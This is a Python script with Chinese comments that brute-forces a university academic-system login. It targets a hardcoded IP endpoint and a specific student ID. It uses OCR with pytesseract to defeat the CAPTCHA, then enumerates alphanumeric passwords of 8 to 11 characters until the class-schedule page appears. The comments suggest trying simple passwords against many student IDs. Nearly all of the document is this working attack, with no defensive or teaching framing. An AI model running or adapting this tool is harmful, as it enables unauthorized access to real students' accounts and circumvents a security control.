# 校园网字典爆破
# 并不现实，因为理论上的平均成功爆破是(10+26+26)**8/2+
# 过程
# 1.在chrome浏览器中打开inspect,拉宽，点network，再点preserve log
# 2.使用错误的账号密码登录一次，找到post的url
# 3.找到需要提供的数组，这里找到的是合成的链接，难道实际上只是个get方法？
# 4.找到验证码的url
# 5.通过将验证码图片灰度化，然后使用pytesseract来识别验证码，识别结果做一个filter
# 5.通过requests中的session维持会话
# 6.找到密码错误、验证码错误等返回的html内关键字
# 7.使用itertools.product穷举密码
# 8.复杂度原因，不易成功，只能对不同学号试用几个简单的密码import pytesseract
import cv2
import requests
from time import sleep
import itertools


path = "valcode.png"
username = "9161010E0230"
password = ""

alter = 0.1

def recognizer():
    img = cv2.imread(path)
    img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    result = pytesseract.image_to_string(img_gray)
    result = "".join([c for c in result if c.isalnum()])
    print("code:", result, end=" ")
    if len(result) == 4:
        return result.lower()
    else:
        return False

print(list(itertools.permutations('ABC',2)))


iters = [itertools.product("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",repeat=i) for i in range(8,12)]

iter = itertools.chain(
    *iters
)


password = next(iter)
password = "".join(password)

count = 1
while True:

    print(f"{count} try, password={password}", end=" ")
    count += 1
    session = requests.session()

    url_code = "http://202.119.81.113:8080/verifycode.servlet"

    image = session.get(url_code, stream=True)

    with open(path, 'wb') as f:
        f.write(image.content)

    code = recognizer()

    if not code:
        print("识别错误")
        sleep(alter)
        continue

    userAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
    header = {
        "Referer": "http://202.119.81.113:8080/Logon.do?method=logon",
        'User-Agent': userAgent,
    }

    responseRes = session.post(
        f"http://202.119.81.113:8080/Logon.do?method=logon&USERNAME={username}&PASSWORD={password}&useDogCode=&RANDOMCODE={code}",
        headers=header)

    # 无论是否登录成功，状态码一般都是 statusCode = 200
    print(f"statusCode = {responseRes.status_code}", end=" ")

    if "我的课表" in responseRes.text:
        print("成功")
        print(f"密码是:{password}")
        break
    elif "验证码错误" in responseRes.text:
        print("验证码错误")
        sleep(alter)
        continue
    elif "密码错误" in responseRes.text:
        print("密码错误")
        password = next(iter)
        password = "".join(password)
        sleep(alter)
        continue
    else:
        print("失败")
